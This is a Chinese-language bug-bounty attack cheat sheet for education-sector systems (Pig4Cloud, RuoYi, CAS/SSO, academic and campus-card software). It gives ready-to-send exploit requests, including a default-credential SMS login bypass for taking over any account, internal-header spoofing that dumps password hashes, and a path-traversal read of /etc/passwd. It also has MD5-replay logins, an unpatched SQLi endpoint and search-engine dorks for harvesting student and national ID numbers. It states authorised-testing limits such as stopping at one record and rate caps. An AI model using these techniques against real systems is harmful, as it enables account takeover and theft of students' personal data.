# EDU 系统级攻击面速查（框架 / 教务 / 统一认证 / 一卡通）

> 配套 `edu-edusrc.md`（平台口径与洞型）—— 那篇讲「报什么、怎么算数」，这篇讲「**打哪儿、怎么打**」。
> 资料时间：**2026-10-04**；本地 PoC 条数来自 `poc "<词>"` 实测（可复核）。
> 用法：**先在前端 JS 里认框架，再翻本表对应段落，照判据验证** —— 不要凭系统名猜洞。

---

## 一、Pig4Cloud（pig 微服务）★ EDU 高危富矿，本地 PoC 库**没有**收录 → 必须手测

判据信号：`/auth/oauth2/token` + `Authorization: Basic ...`、请求头 `Tenant-Id`、`/app/appuser/page`、
`chunk-vendors` 里的 `pig`、`@Inner` 相关接口、Nacos/Quartz/Codegen 微服务端口。

| # | 洞 | 判据（怎么确认） | 危害 |
|---|---|---|---|
| 1 | **默认 OAuth 客户端凭证** | 抓登录包的 `Authorization: Basic` → base64 解码为 `app:app` / `pig:pig` / `social:social` / `mini:mini` / `test:test`（源码 `db/pig.sql` 里 secret = clientId，`{noop}` 明文） | 可伪造客户端发 token 请求 |
| 2 | **短信登录免验证码 → 登录任意用户** ★ | `POST /auth/oauth2/token`，Header `Authorization: Basic c29jaWFsOnNvY2lhbA==`（social:social），体 `grant_type=mobile&mobile=SMS@<手机号>&scope=server`；`social/mini/test` 客户端 `captcha_flag=0` → `ValidateCodeFilter` 跳过校验，`SmsLoginHandler` 只按手机号查用户 | **任意手机号直接拿 token** |
| 3 | **任意用户重置密码** ★ | `/code/image?randomStr=sms@<手机号>` 键注入（验证码 key 与手机号同命名空间） | 重置任意用户密码 |
| 4 | **client secret 明文泄露** | `GET /client/{clientId}`、`GET /client/export` 无 `@HasPermission` → 直接回 `clientSecret` | 撑大 #1/#2 的打击面 |
| 5 | **`@Inner` 仅校验 `from: Y`** ★ | 直连**下游微服务端口**（不经网关）发 `GET /user/info/query?username=admin` + Header `from: Y` → 返回含 BCrypt password/salt | 免 token 读用户；`pig-quartz` 可传 JAR → **RCE** |
| 6 | 管理接口缺权限注解 | `/menu/tree`、`/role/list`、`/dept/org`、`/dict/list`、`/sys-file/group/**` 仅需登录 → 低权用户可读全量用户 | 功能级越权 |
| 7 | 登录用户枚举 | 响应区分 `username_not_found` vs `bad_credentials` | 账号枚举 |
| 8 | RESTful 规范枚举 | `/app/appuser/list` 404 → `/app/appuser/page` 200 → `/app/appuser/info` 200（实测案例：15854 条含 BCrypt hash） | 全站用户泄露 |

**验证纪律**：① 只验到「能拿到 1 条他人记录」即停；② #2 用**自己第二个账号**的手机号做对照，别去登陌生人；
③ 看到 `/client/export` 这类导出接口，**只看一条**、不导出。

---

## 二、若依 / RuoYi（很多高校系统是它的二开）

| 目标 | 命令/URL | 判据 |
|---|---|---|
| Druid 未授权 | `/prod-api/druid/websession.html`（前缀随部署变：`/dev-api`、`/prod-api`） | 页面能直接打开 = 未授权 |
| 任意文件读取（CNVD-2021-01931） | `/common/download/resource?resource=/profile/../../../../etc/passwd` | 回 `/etc/passwd` 内容 |
| **JS 里的未授权接口** ★ | 全局搜 `delete?id=`、`detail?id=`、`getUserByPhone?phone=` → 手工带参访问 | 未登录返回他人数据（案例：`/getUserByPhone?phone=` 直接回明文密码 → 任意用户登录） |
| 定时任务/代码生成 | `/monitor/job`、`/tool/gen` 相关接口 | 仅需登录即用 = 越权 |

本地 PoC：`poc "ruoyi"` 命中 **7**（可用 3）· `poc "若依"` 命中 **5**（可用 1）。

---

## 三、统一认证 / CAS / SSO（每个学校都有，五条出分线的落点）

**识别**：`/cas/login`、`execution=`、`lt=`、`_eventId=submit`、`CASTGC` cookie、`/cas/serviceValidate`。

| 打法 | 具体 | 判据 |
|---|---|---|
| **接口未授权**（最值钱） | 从登录页 JS 抠接口清单逐个 fuzz；典型 `/service/users/sec/index`（绑定安全配置页）**不要鉴权**，输用户名回车 → JSON 里回**该用户个人信息含密码 MD5** | 未登录拿到他人 hash = 未授权；**1 条即停** |
| **登录框前端误用 hash 当密码** | 拿到 MD5 后，把 MD5 串**当明文密码**提交（前端会再 MD5 一次 → 服务端比对成功） | 登录成功 = 逻辑缺陷（案例里就这么进 admin） |
| **忘记密码前端校验绕过** | 抓返回包把 `false→true`、`code 0→1`、`msg 1→2` 逐个试 | 能进到改密步骤 = 绕过；改**自己第二个账号**验证 |
| **账号申诉滥用** | 开放「账号申诉」的站点：用收集到的 sfz/学号走申诉 → **重置他人密码** | 需授权对象本人账号做对照 |
| **用户名枚举** | 找回密码处输用户名，看返回字段（`msg:1` 存在 / `0` 不存在） | 枚举出真实账号 = 中危 |
| **前端 RSA/加密爆破** | 登录包 password 是密文时：JS 里抠公钥（`-----BEGIN PUBLIC KEY-----`）→ 用 Burp 插件 `cloudx` 自动加密爆破 | 爆破出弱口令 |
| **自动化登录（拿到自己账号后）** | 用 `requests.Session` 走：GET 登录页取 `execution`/`lt`/`_eventId` → POST → 保 `CASTGC` → 再访问目标 service 取业务系统 `JSESSIONID` | 能复现即为会话复用链 |

本地 PoC：`poc "CAS"` 命中 **83**。

---

## 四、教务 / 学工 / 一卡通 / 教育软件 Nday（含本地 PoC 条数）

| 系统 | 已知洞 | 本地 PoC |
|---|---|---|
| **青果 KINGOSOFT** | SQLi 0day：`/jw/lessonchangeapply/jwComFileDownload.action`（2025-11 高校预警，无官方补丁）；部分版本 `/admin/` 无 IP 白名单（**搜索引擎可直接发现**） | `poc "青果"` **0**（手测） · `poc "kingosoft"` **3** |
| **正方 zfsoft** | CNVD-2026-25909 教学管理平台 SQLi；登录接口 SQLi、教师/公告栏账号密码复用 | `poc "正方"` **9**（可用 2） · `poc "zfsoft"` **8**（可用 2） |
| **强智科技** | 教务 SQLi（CCERT 点名）；社工钓鱼是有效入口 | `poc "强智"` **0**（手测） |
| **金龙卡一卡通** | 目录遍历 + 未授权操作（CCERT 点名） | `poc "一卡通"` **2**（可用 2） |
| **南京先极教育 CMS** | 文件包含（可下载 `web.xml`） | — |
| **北京国人通 高校管理者培训平台** | SQLi | — |
| **超星学习通** | XSS、信息泄露、逻辑缺陷（任意用户登录） | `poc "超星"/"学习通"` **0**（手测） |
| **泛微 e-cology 9.x** | 新版已修老未授权路径（302 ≠ 404 说明物理存在）；`/api/system/info/interceptionChrome` 曾未过 Spring Security；密码找回 `/authserver/retrieve-password/` 常留用户枚举 | `poc "泛微"` **309** |
| **齐治堡垒机** | 运维设备未授权/弱口令（厂商榜常客） | `poc "堡垒机"` **14**（可用 6） · `poc "齐治"` **1** |
| 通用中间件（EDU 补丁常年滞后） | Shiro 6 · Nacos 31 · Swagger 14 · Actuator 39 · Druid 38 · WebLogic 60 · Struts 46 · Fastjson 33 · ThinkPHP 72 | 见左列数字 |

> **EDU 高价值路径字典**：`/jwglxt /jsxsd /jwxt /xxglxt /ksxt /ykt /ecard /opac /lib /cas /sso /selfservice /sslvpn`
> —— 配合 `probe.py --tech` 的输出（它会自动提示 `poc "<词>"`）。

---

## 五、前端 JS 掘接口（EDU 系统 90% 的前台都是 SPA）

| 信号 | 含义 | 下一步 |
|---|---|---|
| `chunk-vendors.*.js` | **Vue2**（Vue CLI 2/4 打包） | 全局搜 `baseURL`（axios 根前缀） |
| `/assets/index-*.js` + Vite | Vue3 | 搜 `baseURL`/`import.meta.env` |
| `page:function(` / `list:function(` | Vue2 列表查询方法 | 后面通常紧跟 `/users?page=` 这类相对路径 |
| 注释掉的 `//api-` 路径 | 开发遗留接口 | 手工访问（可能未挂鉴权） |
| `.map` 源映射 | 直接还原源码 | `curl <js>.map`（案例：`.map` 泄露直接给密钥与路由） |
| `CreateTime`/`X-Powered-By` 等 | 后端框架线索 | 转 `probe.py --tech` → `poc` |

工具链：`urlfinder` / `jsfinder`（抠 JS 接口）· `katana`（爬 SPA）· `probe.py`（探活+指纹）· `authzdiff.py`（接口清单 → 多身份差分）。

---

## 六、搜索引擎语法（本机无 FOFA key，语法照抄到鹰图/Google/Bing/certspotter）

```text
# 资产面
domain=".edu.cn"                       ip.isp="教育"
org="China Education and Research Network Center"          # ★ 归属收窄
cert.subject.org="某某大学"                                  # ★ 证书归属收窄（最狠）
"系统" && org="China Education and Research Network Center"  # 案例：14 万+ 条

# 找「能注册」的入口（注册 → 拿基础权限 → 越权/逻辑）
host="xx.edu.cn" && body="注册"     同上 && body="申请"     && body="报名" && body="加入"

# 默认凭据入口
body="身份证后六位" && org="China Education and Research Network Center"
title="统一身份认证" || title="统一认证" || body="cas/login"
body="默认密码"

# 学号/工号/证件收集（Google/Bing）
site:*.edu.cn intext:"学号|身份证|手机号|工号"
site:域名 intext:"身份证号码" / intext:"学号" / intext:"考生号" / intext:"忘记密码"

# 批量化/通杀线索
icon_hash="xxx"        # 同一套模板系统 → 通杀（注意：平台对「非同一单位但利用方式相似」会降级）
```

**GitHub 侧**（源码/配置泄露，`py tools/kb_fetch.sh` 不覆盖这块，用 GitHub API + 代理）：
`in:name 教育` · `in:description 高校系统` · `user:<校名> in:readme 数据库配置` · `教务管理 stars:>1000`

---

## 七、把这套用起来的顺序（EDU 开局 30 分钟）

```
1. probe.py 探活 → 选出「非静态站」（有真接口/管理后台）的资产，1 rps
2. 认框架：Pig4Cloud / RuoYi / CAS / 教务 / 泛微 → 翻本表对应段落
3. 找可注册入口（语法）+ 注册一个基础账号 → 翻代理历史找「响应体异常大」的路由
4. 前端 JS 掘接口（baseURL + page:function + .map）→ 得接口清单
5. authzdiff.py 跑多身份差分（anon / invalid / low / 自己第二账号）
6. 命中 → 单条取证 → `fgs fact-add --proof-kind authz_diff` → `fgs verify` → `fgs gate`
7. 修报告（含 Skip 清单）→ 提交（单位归属别填错）
```

**限速红线不变**：EDU ≤2 rps（本机 `probe.py` 默认 1 rps、`authzdiff.py` 默认 qps=1）；
**禁止写/删/改**；只证「能拿到」，**不遍历、不导出**。
